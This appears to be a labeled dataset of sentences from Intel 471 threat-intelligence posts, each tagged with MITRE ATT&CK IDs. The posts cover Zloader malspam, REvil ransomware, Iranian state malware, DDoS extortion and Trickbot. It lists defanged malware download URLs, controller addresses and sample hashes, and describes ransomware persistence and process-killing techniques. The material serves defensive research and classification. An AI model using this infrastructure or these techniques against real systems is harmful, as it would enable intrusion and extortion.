[{"sentence": "> One group, which CrowdStrike had dubbed Cozy Bear, had gained access last summer and was monitoring the DNC\u2019s email and chat communications, Alperovitch said.", "labels": [], "document": "intel471_2016-06-17_who-hacked-the-democratic-national"}, {"sentence": "> The other, which the firm had named Fancy Bear, broke into the network in late April and targeted the opposition research files.", "labels": ["G0007"], "document": "intel471_2016-06-17_who-hacked-the-democratic-national"}, {"sentence": "In this case CrowdStrike said that they observed intrusions in the DNC tied to the groups they call *Cozy Bear* and *Fancy Bear* where Bear signifies Russia.", "labels": ["G0007"], "document": "intel471_2016-06-17_who-hacked-the-democratic-national"}, {"sentence": "This is where CrowdStrike tied this activity to the groups they call *Cozy Bear* and *Fancy Bear.*", "labels": ["G0007"], "document": "intel471_2016-06-17_who-hacked-the-democratic-national"}, {"sentence": "A good example of this is where [iSIGHT Partners](https://isightpartners.com) was able to [tie](http://freebeacon.com/national-security/cyber-caliphate-hackers-not-linked-to-islamic-state/) a claimed Islamic State (ISIL) hacking group to a Russian group they track as APT28.", "labels": ["G0007"], "document": "intel471_2016-06-17_who-hacked-the-democratic-national"}, {"sentence": "The threat actor that sent this malspam campaign demonstrated good operational security (OPSEC) by hiding their infrastructure behind professional bulletproof hosting (BPH) services and by filtering traffic to hide final payloads from curious researchers.", "labels": ["T1566"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "The actor used a series of tools in this operation, including KeitaroTDS, a malicious Microsoft Excel spreadsheet document builder and the Zloader banking trojan (aka Terdot).", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "Considering the nature of the malspam documents (usually named \u201cInvoice\u201d) and the use of a banking trojan, we assess the intended goal of the attackers was to make unauthorized bank transfers from victim accounts.", "labels": ["T1566"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "The document implemented malicious Excel 4.0 Macros (XLM) to download and execute the secondary stage payload.", "labels": ["T1105", "T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "These macros were present in a hidden sheet named \"DiOAFArhpr\".", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "The macros were written vertically, character-by-character inside different cells.", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "This approach was employed to bypass detection since analysis tools can fail to retrieve the command strings.", "labels": ["TA0005"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "The executed macros were:", "labels": ["T1059", "T1204"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "\"C:\\Windows\\system32\\rundll32.exe\",", "labels": ["T1218"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "As shown in the HTTP request below, the malicious server performed a redirection to the GitHub software development platform (GitHub was advised) and downloaded a dynamic link library (DLL) from a public repository.", "labels": ["T1105"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| wgyvjbse[.]pw | 2020-03-18 14:45:51 | Confirmed Zloader controller domain name |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| botiq[.]xyz | 2020-03-18 14:46:16 | Confirmed Zloader controller domain name |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| siloban[.]pw | 2020-03-17 07:54:50 | Linked to [161.117.177[.]248](https://www.virustotal.com/gui/ip-address/161.117.177.248) which is a confirmed Zloader controller address and part of yalishanda\u2019s fast-flux bulletproof hosting infrastructure.", "labels": ["TA0011"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "Also a confirmed Zloader controller domain name.", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "The file invoice-522.xls (SHA256: 34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa) was analyzed on the VirusTotal intelligence platform and found to communicate with the same IP address, although via a different domain and file path.", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "They received a payload that contacted some unknown controllers:", "labels": ["TA0011"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "We recognized these as Zloader control server addresses because they are re-using the milagrecf.php file path for their controller URLs.", "labels": ["TA0011"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "Most of these domains can be linked to malicious Excel documents apparently created by the same malicious document builder.", "labels": ["T1059", "T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "* Using a malicious Excel document builder to craft documents for malspam campaigns.", "labels": ["T1566", "T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "* Using Zloader banking trojan for establishing control on victim machines and staging additional payloads such as hidden virtual network computing (HVNC) and launching web-injects.", "labels": ["T1105"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxps://wgyafqtc[.]online/fgwg24g24g |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxps://tdvomds[.]pw/fgwg24g24g |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxp://tdvomds[.]pw/12341324rfefv |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxps://tdvomds[.]pw/12341324rfefv |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxps://hxzfvomd[.]buzz/asf2f1ff |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxp://hxzfvomd[.]buzz/asf2f1ff |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxp://pjtcdnrd[.]pw/fsgbfgbfsg43 |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43 |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Download link from malicious Excel document | hxxp://wrjmkdod[.]xyz/SDFwef2fvbbe |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://aquolepp[.]pw/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://barbeyo[.]xyz/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://bhajkqmd[.]xyz/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://botiq[.]xyz/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://buhjike[.]host/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://bwambztl[.]xyz/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://dhteijwrb[.]host/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://rizoqur[.]pw/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://siloban[.]pw/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader controller URL | hxxps://wgyvjbse[.]pw/milagrecf.php |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Malicious Excel document sample | cfe139d639d461fe731427e79bd7048849080d4d7d906d10fae764eb056f1f0b |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Malicious Excel document sample | f1ced9008d9de4109844d99fc924b6e3e4a4062ed37b52ce4b5baed430d004cf |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Malicious Excel document sample | 4a5d8cde14f9e8c4f1a0cf514ca084528631d6caa8aa5282a4bf8f58dbf54f33 |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Malicious Excel document sample | 9e5edda543358b7ead2614ff75e23d2c271cb917a89003fa8733d9d730950507 |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Malicious Excel document sample | 30175739414fa301617ed6f0234992f1b3bc67a8547185cd332ad42c5a170486 |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Malicious Excel document sample | 34c5591a749636853aef4f9b3867560319d78ab530a332575fee88a85287dcfa |", "labels": ["T1059"], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | 8021084f2d006101e0522f62de9c1e22ec55a6639e792dc7eff2826c013597a9 |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | e81d729e1b810215940eb96e1de3e9500f522e9ba16bca2f9d49113fb462bb4d |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | 0889271c721391d625a19391275f0e6bf244a5548a1a6eb673c6e16a48e960e1 |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | 3703d42ee0a6c4115295f14f3980cf205f7e6fb77ed0301c845431728015c812 |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | 3f2cf070e3740514c4e0dd431392a6727250a9ad3425c5b25ffad2d9d3b74716 |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | 66f49a261b6086dfdd1c3e2a21f7cb746aa35707490cbd64693d66383ba54c64 |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | 776fee630d6f89a7a01c5903de93fbd9f12f5cba8df148330a8c6f0cd267890b |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | 945e3e4f52d30e07a281b20f96bf7150234c18aa4373c683dee74a194b57dcc0 |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | a347f8b4a17dffa05a4fe9602cf99302201220e7000b5826798dd3d8db7b2b7f |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "| Zloader malware sample | ac60a7471ee5297b9cefb5b3d1c1dbec4b7bf328c8b8649529202a1381acb2a5 |", "labels": [], "document": "intel471_2020-03-26_analysis-of-an-attempted-attack"}, {"sentence": "Changes in REvil ransomware version 2.2", "labels": ["S0496", "T1486"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "The REvil ransomware-as-a-service (RaaS) operation continues to impact businesses worldwide.", "labels": ["S0496", "T1486", "T1486"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "The threat actors responsible for developing and maintaining the malware have released an updated ransomware, namely version 2.2.", "labels": ["T1486"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "### Persistence mechanism", "labels": ["TA0003"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "REvil ransomware persists on a machine if the **arn** configuration field is set to **true**.", "labels": ["S0496", "T1486"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "It writes its path to the registry key **SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run**.", "labels": ["T1547"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "An example of the value name of the registry key entry is **mjOObKp0yy**.", "labels": ["T1547"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "In version 2.1, first collected by our systems March 15, 2020, this persistence mechanism was removed.", "labels": ["TA0003"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "It seems this little experiment didn\u2019t go as planned, because the new version 2.2 brings the same persistence mechanism back.", "labels": ["TA0003"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "### Restart Manager to terminate processes", "labels": ["T1543"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "One of the more interesting new features of REvil version 2.2 is the use of the Windows Restart Manager to terminate processes and services that can lock files targeted for encryption.", "labels": ["S0496", "T1543"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "If a process has an open file handle for a specific file, then writes to that file by another process (in this case, a ransomware) it will be prevented by the Windows operating system (OS).", "labels": ["T1486"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "To circumvent this, the REvil developers have implemented a technique using the Windows Restart Manager also used by other ransomware such as SamSam and LockerGoga (see: ).", "labels": ["S0496", "T1486", "S0370", "S0372", "T1543"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "REvil ransomware opens files for encryption with no sharing (dwShareMode equals 0).", "labels": ["S0496", "T1486"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "The following explains how REvil employs this technique:", "labels": ["S0496"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "* If a normal process is using the file, it is terminated by a call to **TerminateProcess**.", "labels": ["T1543"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "* If a service is encountered, **ControlService** is invoked with the **SERVICE\\\\_CONTROL\\\\_STOP** control code to stop the service followed by a call to **DeleteService**.", "labels": ["T1543"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "* If a critical process is encountered, its critical status is removed by calling **ZwSetInformationProcess** with the information class **ProcessBreakOnTermination** before terminating it.", "labels": ["T1543"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "A new command-line option -silent was added that skips termination of blacklisted processes, services and shadow copy deletion.", "labels": ["T1543"], "document": "intel471_2020-05-04_changes-in-revil-ransomware-version"}, {"sentence": "According to the leaked information, the Islamic Revolutionary Guard Corps (IRGC) and the Iranian Ministry of Intelligence Services (MOIS) developed numerous tools, malicious software, surveillance systems and data analysis platforms, in order to control citizens in Iran and abroad.", "labels": ["T1587"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "According to the information shared by these whistleblowers, Iran is heavily investing in the development of customized tools and malicious software for domestic espionage.", "labels": ["T1587"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "A screenshot from the Abi system monitoring of Sharif UniversityThe Iranian regime also developed customized malware used for stealing information from citizens.", "labels": ["T1587"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "One example found in those leaks was called WinspySuite, a remote access and information stealing malware that reportedly was used specifically to spy on suspects arrested by the regime.", "labels": ["TA0010"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "Internally referred to as Peyvand, the malware allegedly was loaded onto a target\u2019s computer via a USB flash drive during interrogations or sent via a malicious link to a victim\u2019s email address.", "labels": ["T1566", "T1091"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "The regime also developed a remote access tool for Android and iPhone mobile devices as part of a project dubbed Project 220.", "labels": ["T1587"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "The malware purportedly was able to steal sensitive data from a victim\u2019s device, including call data, text messages, contacts and locations.", "labels": ["TA0010"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "A screenshot from the Winspy Suite control panelAnother malware project dubbed Project 420 aka Dolphin developed, deployed and controlled an undisclosed mobile malware capable of collecting and analyzing information about the activities of individuals and groups on social media networks including Facebook, Twitter, and Instagram, and on messaging applications such as Telegram.", "labels": ["TA0009"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "According to leaked information, the regime not only developed tools for stealing sensitive data from its citizens, but also created designated platforms for the collection and analysis of the data.", "labels": ["T1587", "TA0009"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "The MOIS allegedly also abused this access to send phishing emails with malicious attachments from the library\u2019s official email account.", "labels": ["T1566"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "According to this information, the regime gained access to computer systems of numerous airline companies in Bahrain, Dubai, India, Indonesia, Malaysia, Pakistan, the Philippines, Qatar, Saudi Arabia, Thailand and the United Arab Emirates (UAE) for data collection on flights of Iranian citizens.", "labels": ["TA0009"], "document": "intel471_2020-07-08_irans-domestic-espionage"}, {"sentence": "It is important to note that our risk assessment is assigned as a probability of current, active exploitation versus organization-specific risk.", "labels": ["T1203"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Over the course of a year, we observed consistency across underground activity responding to critical vulnerability disclosures and leading up to exploit development.", "labels": ["T1587"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "These indicators could further help identify potential elevation of risk to your organization by recognizing events such as spikes of activity that commonly occur prior to successful exploitation attempts.", "labels": ["T1203"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Additionally, there are several forum threads started where threat actors discuss the possibility of exploitation or seek partners to assist in the development of proof of concept (PoC) and exploit code that leverage the newly announced vulnerability.", "labels": ["T1587"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Closely following these discussions, several threat actors will advertise claims of PoCs and exploits that have successfully been developed, however, claims within this timeframe are typically false.", "labels": ["T1587"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "For example, an actor will claim to have an exploit for a recently disclosed critical vulnerability, including the common vulnerabilities and exposures (CVE) ID or its alias in the initial post.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Vendors and vulnerability researchers likely would include information of existing credible exploit development and successful exploitation of a vulnerability.", "labels": ["T1587", "T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "These sources also may expedite the development of exploits, such as when you see a successful PoC released after patching information for impacted products is provided by the vendor.", "labels": ["T1587"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Threat actors will share links to open source PoCs or exploits in response to the initial sales post and will leave comments such as \u201cthis is a rip off,\u201d \u201cit must be fake, you can get this for free\u201d and more.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Notably, successful exploit development does not necessarily indicate all interested financially motivated cybercriminals will leverage the vulnerability for attacks.", "labels": ["T1587", "T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "While there might be an increase in exploitation attempts, many threat actors will lack the sophistication required to take their interest to the next level.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Attackers can be cautious and use nonspecific details if they report initial entry methods at all, such as claiming to leverage a type of vulnerability or only providing the name of the vulnerable system.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Evidence of this activity allows us to identify threat actors that claim to leverage a specific vulnerability to carry out consistently intrusive cybercriminal activity.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "3.Indicator three \u2013 Fake and private development and sale of PoC and exploit code.", "labels": ["T1587"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "This identifies a clear objective from threat actors seeking to leverage the vulnerability for future attacks.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "4.Indicator four \u2013 Publicly available, legitimate PoC code and threat actors claiming they are attempting to use this code for exploit development.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "In December 2019, we began to see less sophisticated threat actors share information from open source reports about CVE-2019-19781 and new forum threads started where actors sought to buy an exploit for the vulnerability.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Discussions about the potential exploitation of the vulnerability continued until a publicly available exploit was observed in January 2020 and subsequently shared in the underground.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "We reported on threat actors who claimed this vulnerability allowed them access into vulnerable systems as they attempted to move laterally through impacted networks.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "* A prolific seller of network access possibly leveraged the vulnerability to gain unauthorized network access to several organizations.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "* An exploit for the Citrix vulnerability was publicly available.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "An actor posted the GitHub link on a previously opened post thread and several actors circulated exploits for the vulnerability.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "* An actor shared several code variants for CVE-2019-19781.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "* A Russian-speaking actor was suspected to have leveraged the Citrix vulnerability after released compromised access revealed the impacted company uses Citrix System Software, however, the assessment was not confirmed.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "The actor claimed to use publicly available code for exploitation after scanning the internet for vulnerable hosts.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "* A handful of actors, including a notable threat actor with a positive underground reputation, claimed responsibility for many compromised network accesses likely using the Citrix vulnerability as an initial attack vector into compromised victim organizations.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "The F5 vulnerability allowed unauthenticated attackers or authenticated users with network access to execute arbitrary system commands, create or delete files, disable services and execute arbitrary Java code.", "labels": ["T1565", "TA0002", "T1629", "T1059"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Although the vendor released fixed versions and mitigation information, there was rapid development of exploit code and implementation into an attack framework.", "labels": ["T1587"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Because the vulnerability was quickly productized and there was evidence of threat actors attempting to leverage the CVE in attacks, the overall risk of exploitation score is high.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "There is clear underground interest in CVE-2020-1350 based on threat actor posts seeking to develop code to leverage this vulnerability.", "labels": ["T1587"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "However, a closer look at the actors that expressed an initial interest in leveraging the vulnerability shows no specific historical activity to indicate these individuals are sophisticated enough to carry out an exploitation of the SIGRed vulnerability alone.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "The activity remains an indicator of increase in risk scoring and probability of exploitation, but there likely will be many follow-on indicators that will press the severity higher.", "labels": ["T1190"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "* A denial of service (DoS) PoC was released publicly on GitHub.", "labels": ["T1499"], "document": "intel471_2020-08-12_prioritizing-critical-vulnerabilities-a-threat"}, {"sentence": "Criminals posing as Lazarus Group threatened Travelex: Bitcoin or DDoS", "labels": ["G0032", "T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "A group posing as notorious nation-state-linked hacking group \u201cLazarus Group\u201d threatened to hit British foreign exchange company Travelex with a distributed-denial-of-service (DDoS) attack unless it paid 20 bitcoins.", "labels": ["G0032", "T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "Following the extortion email, the threat actor conducted a volumetric attack on a custom port of four IP addresses serving the company\u2019s subdomains.", "labels": ["T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "The true actors or groups likely possess some DDoS capabilities that need to be taken seriously, so organizations should be prepared to deal with that sort of attack as part of their cybersecurity plan.", "labels": ["T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "The threat to Travelex comes as the company underwent one of the most notable ransomware attacks of the past year.", "labels": ["T1486"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "In January, the company was [hit with REvil ransomware](https://www.cyberscoop.com/travelex-sodinokibi-ransomware/), forcing it to suspend all of its online services, including its app and internal email systems, for several weeks.", "labels": ["S0496", "T1486"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "Groups posing as nation-state hacking groups while threatening ransom-backed DDoS attacks have been bubbling up over the past year.", "labels": ["T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "The threat actors claimed to represent the Russian hacker group Fancy Bear and demanded a ransom to avoid a DDoS attack.", "labels": ["G0007", "T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "Additionally, the New Jersey Cybersecurity and Communications Integration Cell [issued an advisory](https://www.cyber.nj.gov/alerts-advisories/extortionists-claiming-to-be-apt-groups-threaten-ddos-attacks) in August on actors who targeted the finance and retail sectors with DDoS attacks, claiming to be members of Fancy Bear and Armada Collective.", "labels": ["T1499", "G0007"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "New Zealand-based enterprises [have seen a rash of DDoS attacks](https://www.stuff.co.nz/business/industries/122636840/metservice-anticipates-future-ddos-cyberattacks-in-coming-days) over the past few months.", "labels": ["T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "In August, the New Zealand stock exchange was hit by a DDoS attack that spanned several days and caused a disruption of some services.", "labels": ["T1499", "T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "The Meteorological Service of New Zealand, news media company Stuff, public-service radio broadcaster Radio New Zealand and Australian bank Westpac Banking Corp have also been hit with DDoS attacks in recent weeks.", "labels": ["T1499"], "document": "intel471_2020-10-13_travelex-ddos-attack-lazarus-group"}, {"sentence": "That was quick: Trickbot is back after disruption attempts", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "The Trickbot botnet looks to be working once again, despite separate efforts in the past few weeks aimed at disrupting its operation.", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "On October 14, 2020, the Emotet spam botnet \u2014 which is often the precursor to TrickBot being loaded onto a system \u2014 began receiving spam templates intended for mass distribution.", "labels": ["S0367", "S0183", "T1566", "T1566"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "These spam templates contained a Microsoft Word document attachment with malicious macros that fetch and load a copy of Emotet onto the victim machine.", "labels": ["T1566", "S0367", "T1204", "T1105"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "The Emotet bots reached out to their controllers and received commands to download and execute Trickbot on victim machines.", "labels": ["S0367", "S0266", "T1105"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "The Trickbot group tag that Intel 471 identified is tied to a typical infection campaign that information security researchers have been observing for the past 6 months or more.", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "Additionally Intel 471 researchers saw an update to the Trickbot plugin server configuration file.", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "The fix is another round in the back-and-forth between Trickbot\u2019s operators and the separate parties that have attempted to disrupt the botnet\u2019s actions.", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "Cyber Command was conducting an operation to disrupt Trickbot.", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "Additionally, Microsoft issued a [public statement](https://blogs.microsoft.com/on-the-issues/2020/10/12/trickbot-ransomware-cyberthreat-us-elections/) on Oct. 12, 2020 that it had taken legal action to \u201ccombat ransomware ahead of U.S. elections.", "labels": ["T1486"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "The legal action involved Microsoft attempting to disrupt a number of Trickbot command and control server IP addresses that are in the United States.", "labels": ["S0266", "TA0011"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, {"sentence": "The fact that Trickbot has resumed normal operations despite the best efforts of U.S.", "labels": ["S0266"], "document": "intel471_2020-10-15_trickbot-online-emotet-microsoft-cyber"}, 